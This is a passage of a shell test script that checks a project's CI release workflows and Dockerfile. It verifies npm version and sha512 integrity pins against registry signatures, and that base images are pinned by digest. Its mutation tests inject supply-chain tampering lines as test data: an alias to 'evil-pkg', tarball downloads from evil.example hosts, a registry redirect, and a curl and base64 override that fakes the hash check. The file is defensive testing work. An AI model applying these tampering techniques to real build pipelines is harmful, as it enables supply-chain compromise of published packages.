	ok "release-exec.yml and sidecar-release.yml pin the same exact npm (${npm_pins})"
else
	no "release-exec.yml and sidecar-release.yml pin the same exact npm" "got: ${npm_pins}"
fi
# ...from the same tarball (#1000): one NPM_VERSION and NPM_INTEGRITY pair
# across both, and that pair is what the registry holds. A version bumped
# without its integrity, or with a wrong one, fails here instead of at the
# install step of a release. This asks registry.npmjs.org (the packument,
# then the tarball itself, hashed here), as the bun install in the same CI
# job does, and fails if it cannot.
# npm_pin_check <workflow dir>: one violation per line, nothing when clean.
npm_pin_check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	DIR="$1" bun -e '
const fs = require("node:fs");
const out = [];
const pins = new Set(["release-exec.yml", "sidecar-release.yml"].map((f) => {
  const e = Bun.YAML.parse(fs.readFileSync(process.env.DIR + "/" + f, "utf8")).env ?? {};
  return JSON.stringify([e.NPM_VERSION ?? null, e.NPM_INTEGRITY ?? null]);
}));
if (pins.size !== 1) out.push("release-exec.yml and sidecar-release.yml pin different npm tarballs: " + [...pins].join(" and "));
const [v, want] = JSON.parse([...pins][0]);
if (!/^\d+\.\d+\.\d+$/.test(String(v)) || !/^sha512-[A-Za-z0-9+\/]{86}==$/.test(String(want))) out.push("NPM_VERSION " + JSON.stringify(v) + " and NPM_INTEGRITY " + JSON.stringify(want) + " are not an exact version and a sha512 integrity");
else {
  const url = "https://registry.npmjs.org/npm/-/npm-" + v + ".tgz";
  try {
    const r = await fetch("https://registry.npmjs.org/npm/" + v, { signal: AbortSignal.timeout(Number(process.env.NPM_PIN_TIMEOUT_MS || 60000)) });
    if (r.status !== 200) out.push("the registry answered HTTP " + r.status + " for npm@" + v + ", so the pin could not be checked");
    else {
      const m = await r.json();
      if (m.version !== v) out.push("the registry answered for npm@" + JSON.stringify(m.version) + ", not npm@" + v);
      // npm versions are immutable, so this means one of two things (review
      // of #1000): NPM_VERSION was bumped without its integrity, or the
      // registry now serves other bytes for a version already pinned.
      if (m.dist?.integrity !== want) out.push("the registry dist.integrity for npm@" + v + " is " + JSON.stringify(m.dist?.integrity) + ", not NPM_INTEGRITY " + want +
        ": if NPM_VERSION was just bumped, bump NPM_INTEGRITY with it, after checking the value against a second source; if it was not, an immutable version changed: do not re-pin, find out why");
      // Signed, for exactly this name, version and integrity, by the npm
      // registry key pinned here, not one fetched beside the packument
      // (review of #1000): a path that can rewrite the packument could
      // serve keys to match. The key is the one /-/npm/v1/keys listed on
      // 2026-10-14 (expires null), and the same keyid and key are in the
      // registry.npmjs.org delegation of the Sigstore TUF repository
      // (tuf-repo-cdn.sigstore.dev, keys.json sha256 160677eb...). It
      // still is the registry own key, so it is no defence against the
      // registry itself. If npm rotates it, this fails: pin the new key
      // after checking it there.
      const npmKeyId = "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U";
      const npmKey = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEY6Ya7W++7aUPzvMTrezH6Ycx3c+HOKYCcNGybJZSCJq/fd7Qa8uuAKtdIkUQtQiEKERhAmE5lMMJhP8OkDOa2g==";
      const crypto = require("node:crypto");
      const pub = crypto.createPublicKey({ key: Buffer.from(npmKey, "base64"), format: "der", type: "spki" });
      const sigs = Array.isArray(m.dist?.signatures) ? m.dist.signatures : [];
      const good = sigs.filter((sg) => sg.keyid === npmKeyId &&
        crypto.verify("sha256", Buffer.from("npm@" + v + ":" + want), pub, Buffer.from(String(sg.sig), "base64")));
      if (!good.length) out.push("no registry signature over npm@" + v + ":" + want + " verifies with the pinned npm registry key " + npmKeyId);
      if (m.dist?.tarball !== url) out.push("the registry serves npm@" + v + " from " + JSON.stringify(m.dist?.tarball) + ", not " + url + ", which the install step fetches");
      const t = await fetch(url, { redirect: "error", signal: AbortSignal.timeout(120000) });
      if (t.status !== 200) out.push("the registry answered HTTP " + t.status + " for " + url + ", so the pin could not be checked");
      else {
        const got = "sha512-" + new Bun.CryptoHasher("sha512").update(new Uint8Array(await t.arrayBuffer())).digest("base64");
        if (got !== want) out.push(url + " has sha512 " + got + ", not NPM_INTEGRITY " + want);
      }
    }
  } catch (err) {
    out.push("could not check npm@" + v + " against the registry (" + String(err) + "), so this check fails rather than pass unchecked");
  }
}
if (out.length) console.log(out.join("\n"));
'
}
found="$(npm_pin_check "$WORKFLOWS")" || found="the npm pin check itself failed (exit $?): $found"
if [ -z "$found" ]; then
	ok "NPM_INTEGRITY is the sha512 the registry holds and serves for NPM_VERSION, in both npm publishers (#1000)"
else
	no "NPM_INTEGRITY is the sha512 the registry holds and serves for NPM_VERSION, in both npm publishers (#1000)" "$found"
fi
# npm_pin_caught <label> <reason> <file> <exact text> <replacement> [<file> <exact text> <replacement>]
npm_pin_caught() {
	local label="$1" reason="$2"
	shift 2
	rm -rf "${WORK}/npmpin" && cp -rL "$WORKFLOWS" "${WORK}/npmpin"
	while [ "$#" -ge 3 ]; do
		if ! FROM="${WORK}/npmpin/$1" OLD="$2" NEW="$3" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) process.exit(2);
await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
'; then
			no "npm pin mutant '${label}' could be applied ($1 no longer has the text it mutates)"
			return
		fi
		shift 3
	done
	found="$(npm_pin_check "${WORK}/npmpin")" || found="the npm pin check itself failed (exit $?): $found"
	if grep -qF -- "$reason" <<<"$found"; then ok "reports: ${label}"; else no "reports: ${label}, for the reason it exists" "wanted '${reason}', got: ${found}"; fi
}
# The registry out of reach (a proxy that refuses) fails the check rather
# than passing it unchecked (review of #1000).
found="$(NPM_PIN_TIMEOUT_MS=5000 HTTPS_PROXY=http://127.0.0.1:1 https_proxy=http://127.0.0.1:1 npm_pin_check "$WORKFLOWS")" || found="the npm pin check itself failed (exit $?): $found"
if grep -qF 'so this check fails rather than pass unchecked' <<<"$found"; then
	ok "reports: the registry out of reach, rather than passing unchecked (#1000 review)"
else
	no "reports: the registry out of reach, rather than passing unchecked (#1000 review)" "got: ${found}"
fi
npm_pin_caught 'NPM_VERSION bumped in both publishers without NPM_INTEGRITY (#1000)' \
	'the registry dist.integrity for npm@12.2.0 is' \
	release-exec.yml '  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "12.2.0"' \
	sidecar-release.yml '  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "12.2.0"'
npm_pin_caught 'NPM_INTEGRITY bumped in one publisher only (#1000)' \
	'pin different npm tarballs' \
	sidecar-release.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-A'
npm_pin_caught 'NPM_INTEGRITY wrong in both publishers, seen in the registry signatures (#1000 security review)' \
	'no registry signature over npm@12.1.0:sha512-AAAA' \
	release-exec.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" #' \
	sidecar-release.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" #'
npm_pin_caught 'NPM_INTEGRITY wrong in both publishers (#1000)' \
	'the registry dist.integrity for npm@12.1.0 is' \
	release-exec.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" #' \
	sidecar-release.yml '  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" #'
# ...and nothing below the workflow level sets NPM_VERSION again (#960), in
# any workflow: the npm publishers exempt the pinned npm install by its
# text, so the variable has to be the pin wherever that line runs; nor
# (#1000) NPM_INTEGRITY, and npm is installed only from the tarball checked
# against it, never by version.
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f"): NPM_VERSION and NPM_INTEGRITY are set once, at the top, and npm is installed only from the checked tarball" npmpin "$f"
done
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'a job setting NPM_VERSION to an npm: alias over the pin (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      NPM_VERSION: "npm:evil-pkg@12.1.0"\n    # Same requirement' \
		'publish-sidecar: sets NPM_VERSION over the workflow pin'
	expect_caught 'a step setting NPM_VERSION to an npm: alias over the pin (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          NPM_VERSION: "npm:evil-pkg@12.1.0"\n        run: |' \
		'publish-brain: step Ensure npm supports Trusted Publishing sets NPM_VERSION over the workflow pin'
	expect_caught 'a step setting npm_version in another case (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          npm_version: "npm:evil-pkg@12.1.0"\n        run: |' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing sets npm_version over the workflow pin'
	expect_caught 'NPM_VERSION set for later steps through GITHUB_ENV (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |\n          set -euo pipefail\n' $'      - name: Ensure npm supports Trusted Publishing\n        run: |\n          set -euo pipefail\n          echo "NPM_VERSION=npm:evil-pkg@12.1.0" >> "$GITHUB_ENV"\n' \
		'sets NPM_VERSION in its script'
	expect_caught 'NPM_VERSION assigned in the script that installs npm (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          export NPM_VERSION=npm:evil-pkg@12.1.0\n          # Checked where it is used' \
		'sets NPM_VERSION in its script'
	expect_caught 'NPM_VERSION defaulted with := in the script (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
		'          npm_tgz="$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz"' '          npm_tgz="$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION:=npm:evil-pkg@12.1.0}.tgz"' \
		'sets NPM_VERSION in its script'
	expect_caught 'the workflow pin itself an npm: alias (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		'  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "npm:evil-pkg@12.1.0"' \
		'env.NPM_VERSION is "npm:evil-pkg@12.1.0", not an exact x.y.z'
	expect_caught 'a job container setting NPM_VERSION (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    container:\n      image: x\n      env:\n        NPM_VERSION: "npm:evil-pkg@12.1.0"\n    # Same requirement' \
		'publish-sidecar: its container sets NPM_VERSION over the workflow pin'
	expect_caught 'a workflow with no pin of its own gaining a job-level one (#960)' npmpin "$WORKFLOWS/test.yml" \
		$'jobs:\n' $'jobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    env:\n      NPM_VERSION: "npm:evil-pkg@12.1.0"\n    steps:\n      - run: npm install -g "npm@${NPM_VERSION}"\n' \
		'sneak: sets NPM_VERSION over the workflow pin'
	expect_caught 'a global install of npm through an npm: alias (#960)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm install -g "npm@npm:evil-pkg@12.1.0"' \
		'global install of npm@npm:evil-pkg@12.1.0 is not an exact version'
	expect_caught 'a global install of a scoped package through an alias (#960)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm install -g "@scope/tool@npm:evil-pkg@1.0.0"' \
		'global install of @scope/tool@npm:evil-pkg@1.0.0 is not an exact version'
	expect_caught 'a global install with the flag before the verb (#960 review)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm -g install "npm@npm:evil-pkg@12.1.0"' \
		'global install of npm@npm:evil-pkg@12.1.0 is not an exact version'
	expect_caught 'a global install of a URL (#960 review)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm i -g https://evil.example/x@1.2.3' \
		'global install of https://evil.example/x@1.2.3 is not an exact version'
	expect_caught 'the alias installed with the flag first in the npm publish job (#960 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' $'          npm install -g --offline --ignore-scripts "$npm_tgz"\n          npm -g install "npm@npm:evil-pkg@12.1.0"' \
		'publish-sidecar: publishes with id-token and runs: npm -g install'
	expect_caught 'the pinned install pointed at another registry on its own line (#960 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm_config_registry=https://registry.evil.example/ npm install -g --offline --ignore-scripts "$npm_tgz"' \
		'publish-sidecar: publishes with id-token and runs: npm_config_registry='
	expect_caught 'npm_config_registry in the npm publish job env (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env:\n      npm_config_registry: https://registry.evil.example/\n' \
		'publish-brain: job env sets npm_config_registry in a job that publishes with id-token'
	expect_caught 'setup-node pointing the npm publish job at another registry (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
		'          registry-url: "https://registry.npmjs.org"' '          registry-url: "https://registry.evil.example"' \
		'publish-brain: setup-node registry-url is'
	expect_caught 'a default shell that sets NPM_VERSION first (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: env NPM_VERSION=npm:evil-pkg@12.1.0 bash -e {0}\n' \
		'publish-brain: step with shell: env NPM_VERSION=npm:evil-pkg@12.1.0 bash -e {0}'
	expect_caught 'a step shell that runs code before the script (#960 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        shell: bash -c \x27export NPM_VERSION=npm:evil-pkg@12.1.0; . {0}\x27\n        run: |' \
		'publish-brain: step with shell: bash -c'
	expect_caught 'the pinned install without its exact-version check (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }\n' '' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm without the exact-version check'
	expect_caught 'the exact-version check loosened (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		'          [[ "$NPM_VERSION" =~ ^[0123456789]+\.[0123456789]+\.[0123456789]+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }' '          [[ "$NPM_VERSION" =~ ^.+$ ]] || { echo "::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)"; exit 1; }' \
		'installs npm without the exact-version check'
	# The check moved below the install: the text from the check to the
	# install (#1000 put the download and sha512 check in between) is read
	# from the workflow, and only its first line moves.
	npm_blk="$(FILE="$WORKFLOWS/sidecar-release.yml" bun -e '
const s = await Bun.file(process.env.FILE).text();
const a = s.indexOf("          [[ \"$NPM_VERSION\" =~");
const end = "          npm install -g --offline --ignore-scripts \"$npm_tgz\"";
const b = s.indexOf(end, a);
if (a < 0 || b < 0) process.exit(2);
process.stdout.write(s.slice(a, b + end.length));
')" || npm_blk="(the block was not found)"
	expect_caught 'the exact-version check after the install (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		"$npm_blk" "${npm_blk#*$'\n'}"$'\n'"${npm_blk%%$'\n'*}" \
		'installs npm without the exact-version check'
	expect_caught 'the pinned install in a step that may continue on error (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        continue-on-error: true\n        run: |' \
		'may continue on error'
	expect_caught 'a GITHUB_ENV line built from an env value (#960 review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          L: "NPM_VERSION=npm:evil-pkg@12.1.0"\n        run: |' \
		'has an env value that sets NPM_VERSION'
	expect_caught 'NPM_VERSION appended to (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          NPM_VERSION+=-x\n          # Checked where it is used' \
		'sets NPM_VERSION in its script'
	expect_caught 'NPM_VERSION read from input (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          read -r NPM_VERSION <v.txt\n          # Checked where it is used' \
		'sets NPM_VERSION in its script'
	expect_caught 'NPM_VERSION set by printf -v (#960 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          printf -v NPM_VERSION %s x\n          # Checked where it is used' \
		'sets NPM_VERSION in its script'
	expect_caught 'the npm tarball installed without its sha512 check (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          [ "$got" = "$NPM_INTEGRITY" ] || { echo "::error::npm-${NPM_VERSION}.tgz from the registry is ${got}, not the pinned NPM_INTEGRITY (#1000)"; exit 1; }\n' '' \
		'pack-brain: step Install the pinned npm installs npm without the exact-version check and the sha512 check of its tarball'
	expect_caught 'the sha512 check loosened to any digest (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		'          [ "$got" = "$NPM_INTEGRITY" ] ||' '          [ -n "$got" ] ||' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm without the exact-version check and the sha512 check'
	expect_caught 'the npm tarball fetched from another host (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
		'"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz"' '"https://registry.evil.example/npm-${NPM_VERSION}.tgz"' \
		'pack-brain: step Install the pinned npm installs npm without the exact-version check and the sha512 check'
	expect_caught 'a step between the sha512 check and the install (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' $'          curl -fsS -o "$npm_tgz" https://evil.example/npm.tgz\n          npm install -g --offline --ignore-scripts "$npm_tgz"' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm without the exact-version check and the sha512 check'
	expect_caught 'npm installed by version again, in the job that packs (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm install -g "npm@${NPM_VERSION}"' \
		'pack-brain: step Install the pinned npm installs npm by version, not from a tarball checked against NPM_INTEGRITY'
	expect_caught 'npm installed by a literal version in a workflow with no pin (#1000)' npmpin "$WORKFLOWS/test.yml" \
		$'jobs:\n' $'jobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions: {}\n    steps:\n      - run: npm i -g npm@12.1.0\n' \
		'sneak: step 0 installs npm by version, not from a tarball checked against NPM_INTEGRITY'
	expect_caught 'a step setting NPM_INTEGRITY over the pin (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          NPM_INTEGRITY: sha512-x\n        run: |' \
		'publish-brain: step Ensure npm supports Trusted Publishing sets NPM_INTEGRITY over the workflow pin'
	expect_caught 'a job setting npm_integrity in another case (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      npm_integrity: sha512-x\n    # Same requirement' \
		'publish-sidecar: sets npm_integrity over the workflow pin'
	expect_caught 'NPM_INTEGRITY set for later steps through GITHUB_ENV (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          echo "NPM_INTEGRITY=sha512-x" >> "$GITHUB_ENV"\n          # Checked where it is used' \
		'sets NPM_INTEGRITY in its script'
	expect_caught 'the integrity pin not a sha512 (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		'  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha1-x" #' \
		'env.NPM_INTEGRITY is "sha1-x", not a sha512 integrity'
	expect_caught 'the integrity pin gone from a workflow that installs npm (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
		'  NPM_INTEGRITY: "sha512-' '  OLD_INTEGRITY: "sha512-' \
		'the workflow installs npm but sets no NPM_INTEGRITY at the top'
	expect_caught 'the npm tarball installed with its version pin gone (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		'  NPM_VERSION: "12.1.0"' '  OLD_VERSION: "12.1.0"' \
		'the workflow installs npm but sets no NPM_VERSION at the top'
	expect_caught 'curl and base64 redefined above the checks (#1000 security review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          if [ -n "${RUNNER_TEMP:-}" ]; then curl() { command curl -fsS -o "$npm_tgz" https://evil.example/npm.tgz; }; base64() { cat >/dev/null; printf %s "${NPM_INTEGRITY#sha512-}"; }; fi\n          # Checked where it is used' \
		'pack-brain: step Install the pinned npm installs npm in a script that is not exactly the one this rule allows'
	expect_caught 'the checks turned into a heredoc that never runs (#1000 security review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          curl -fsS -o /tmp/x.tgz https://evil.example/npm.tgz\n          : <<\'#\'\n          # Checked where it is used' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm in a script that is not exactly the one this rule allows'
	expect_caught 'the install step given an env of its own (#1000 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'      - name: Install the pinned npm\n        run: |' $'      - name: Install the pinned npm\n        env:\n          X: "1"\n        run: |' \
		'pack-brain: step Install the pinned npm installs npm in a step with a shell: or env: of its own'
	expect_caught 'the install step run by a shell that runs code first (#1000 review)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'      - name: Install the pinned npm\n        run: |' $'      - name: Install the pinned npm\n        shell: bash -c \x27curl() { :; }; . {0}\x27\n        run: |' \
		'pack-brain: step Install the pinned npm installs npm in a step with a shell: or env: of its own'
	expect_caught 'the npm tarball installed with npm free to fetch more (#1000)' mutable "$WORKFLOWS/release-exec.yml" \
		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm install -g --ignore-scripts "$npm_tgz"' \
		'pack-brain: step Install the pinned npm: global install of $npm_tgz is not an exact version'
}
# The image publish-docker pushes is built FROM these (#783). A base by tag
# alone is whatever the registry says that day, so every external FROM names a
# tag AND a digest, one tag never maps to two digests, and the Bun bases run
# the Bun CI tests (release-exec.yml BUN_VERSION).
# dockerfile_check <Dockerfile> <workflow with BUN_VERSION>: one violation per
# line, nothing when clean.
dockerfile_check() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	DOCKERFILE="$1" FILE="$2" bun -e '
const text = await Bun.file(process.env.DOCKERFILE).text();
const bun = String(Bun.YAML.parse(await Bun.file(process.env.FILE).text()).env?.BUN_VERSION ?? "");
const out = [];
if (!/^\d+\.\d+\.\d+$/.test(bun)) out.push("BUN_VERSION is not an exact version: " + JSON.stringify(bun));
const stages = new Set(["scratch"]);
const digests = new Map();
let bases = 0;
// Continuations joined, so a FROM split over lines is still one instruction.
for (const line of text.replace(/\\\r?\n/g, " ").split(/\r?\n/)) {
  const m = /^\s*FROM\s+(.*)$/i.exec(line);
  if (!m) continue;
  const words = m[1].trim().split(/\s+/).filter((w) => !w.startsWith("--"));
  const image = words[0] ?? "";
  const as = words.findIndex((w) => /^as$/i.test(w));
  // A stage defined on an EARLIER line is not a registry image.
  const local = stages.has(image.toLowerCase());
  if (as > 0 && words[as + 1]) stages.add(words[as + 1].toLowerCase());
  if (local) continue;
  const p = /^([^\s@:]+(?::\d+)?(?:\/[^\s@:]+)*):([^\s@:]+)@sha256:([0-9a-f]{64})$/.exec(image);
  if (!p) { out.push("FROM " + image + " is not pinned by tag and digest (name:tag@sha256:...)"); continue; }
  const [, name, tag, sum] = p;
  const key = name.replace(/^(docker\.io\/)?(library\/)?/, "") + ":" + tag;
  if (digests.has(key) && digests.get(key) !== sum) out.push(key + " is pinned to two different digests");
  digests.set(key, sum);
  if (/^(docker\.io\/)?oven\/bun$/.test(name)) {
    bases++;
    if (tag !== bun && !tag.startsWith(bun + "-"))
      out.push("FROM " + image + " runs Bun " + tag + ", but CI tests BUN_VERSION " + bun);
  }
}
// Without this, a Dockerfile that stopped naming oven/bun would pass vacuously.
if (bases === 0) out.push("no oven/bun base image found, so the Bun version check checked nothing");
if (out.length) console.log(out.join("\n"));
'
}
found="$(dockerfile_check "${HERE}/../../Dockerfile" "$WORKFLOWS/release-exec.yml")"
if [ -z "$found" ]; then
	ok "Dockerfile: every base image is pinned by tag and digest, and the Bun bases match BUN_VERSION"
else
	no "Dockerfile: every base image is pinned by tag and digest, and the Bun bases match BUN_VERSION" "$found"
fi
# dockerfile_caught <label> <exact text> <replacement>: a mutated Dockerfile copy must be reported.
dockerfile_caught() {
	local copy="${WORK}/Dockerfile.mutant"
	if ! FROM="${HERE}/../../Dockerfile" TO="$copy" OLD="$2" NEW="$3" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
'; then
		no "Dockerfile mutant '$1' could be applied (the Dockerfile no longer has the text it mutates)"
		return
	fi
	if [ -n "$(dockerfile_check "$copy" "$WORKFLOWS/release-exec.yml")" ]; then
		ok "reports: $1"
	else
		no "reports: $1" "the check passed a Dockerfile with this hole"
	fi
}
dockerfile_caught 'a floating oven/bun:1 base (#783)' \
	'FROM oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895 AS deps' 'FROM oven/bun:1 AS deps'
dockerfile_caught 'a floating slim production base (#783)' \
	'FROM oven/bun:1.4.2-slim@sha256:cb3bbbb08e13a4a2ff400f24c7a2a1d5efa83f6ef8544d52d95a519631e2fc61 AS production' 'FROM oven/bun:1.4.2-slim AS production'
dockerfile_caught 'a digest-pinned base on a Bun CI does not test (#783)' \
	'FROM oven/bun:1.4.2-slim@sha256:' 'FROM oven/bun:1.3.14-slim@sha256:'
dockerfile_caught 'one tag pinned to two digests (#783)' \
	'FROM oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895 AS deps' 'FROM oven/bun:1.4.2@sha256:0000000000000000000000000000000000000000000000000000000000000000 AS deps'
dockerfile_caught 'an undigested base behind --platform (#783)' \
	'FROM --platform=$BUILDPLATFORM oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895 AS workflows' 'FROM --platform=$BUILDPLATFORM oven/bun:latest AS workflows'
dockerfile_caught 'some other base image by tag alone (#783)' \
	'FROM deps AS build' 'FROM debian:trixie AS build'
# ...and every other Bun pin is that same version (#783 review): the image
# runs what CI tests only while CI tests one Bun. Every `bun-version:` and
# BUN_VERSION in the workflows and in local composite actions (inputs
# defaults), with env references resolved, and every oven/bun image a run:
# starts (by digest).
# bun_pins <workflow dir> <actions dir>: one violation per line.
bun_pins() {
	# shellcheck disable=SC2016 # JavaScript source, not shell.
	DIR="$1" ACTIONS="$2" bun -e '
const fs = require("node:fs");
const out = [];
const want = String(Bun.YAML.parse(fs.readFileSync(process.env.DIR + "/release-exec.yml", "utf8")).env?.BUN_VERSION ?? "");
const envRef = /^\$\{\{\s*env\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}$/;
const inputRef = /^\$\{\{\s*inputs\.([A-Za-z0-9_-]+)\s*\}\}$/;
let seen = 0;
const visit = (file, o, path, scopes, inputs) => {
  if (!o || typeof o !== "object") return;
  const env = o.env && typeof o.env === "object" ? [o.env, ...scopes] : scopes;
  for (const [k, v] of Object.entries(o)) {
    if ((k === "bun-version" || k === "BUN_VERSION") && (typeof v === "string" || typeof v === "number")) {
      let val = String(v);
      const e = envRef.exec(val);
      if (e) { const sc = env.find((x) => x && e[1] in x); if (sc) val = String(sc[e[1]]); }
      const n = inputRef.exec(val);
      if (n && inputs && n[1] in inputs) val = String(inputs[n[1]]?.default ?? "");
      seen++;
      if (val !== want) out.push(file + ": " + path + "." + k + " is " + JSON.stringify(val) + ", but release-exec.yml BUN_VERSION (and so the Dockerfile) is " + JSON.stringify(want));
    }
    // An oven/bun image a run: starts is a Bun pin too, and must carry a digest.
    if (k === "run" && typeof v === "string")
